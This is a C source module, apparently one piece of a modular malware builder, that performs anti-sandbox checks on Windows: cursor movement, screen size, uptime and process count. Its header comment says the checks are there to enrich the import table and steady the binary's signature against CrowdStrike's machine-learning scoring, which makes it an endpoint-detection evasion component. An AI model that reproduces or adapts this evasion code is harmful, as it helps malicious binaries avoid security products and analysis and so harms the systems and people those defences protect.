// chunk: evasion/anti_sandbox
// depends: (none)
// provides: check_sandbox
// headers: windows.h,tlhelp32.h
// risk: high
// note: Environment fingerprinting that doubles as ML-friendly API diversity.
//   All checks run (cursor, screen, uptime, process count) to build a rich
//   import table, but results are consumed silently — never gates execution.
//   This keeps the binary signature identical for CrowdStrike ML scoring
//   while working in all deployment scenarios including SSH.

#ifndef CHUNK_ANTI_SANDBOX
#define CHUNK_ANTI_SANDBOX

#include <windows.h>
#include <tlhelp32.h>

static int check_sandbox(void) {
    volatile int score = 0;

    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);
    if (p1.x == p2.x && p1.y == p2.y) {
        Sleep(3000);
        GetCursorPos(&p2);
        if (p1.x == p2.x && p1.y == p2.y)
            score++;
    }

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w < 800 || h < 600)
        score++;

    DWORD uptime = GetTickCount();
    if (uptime < 10 * 60 * 1000)
        score++;

    int proc_count = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do { proc_count++; } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    if (proc_count < 20)
        score++;

    (void)score;
    return 0;
}

#endif
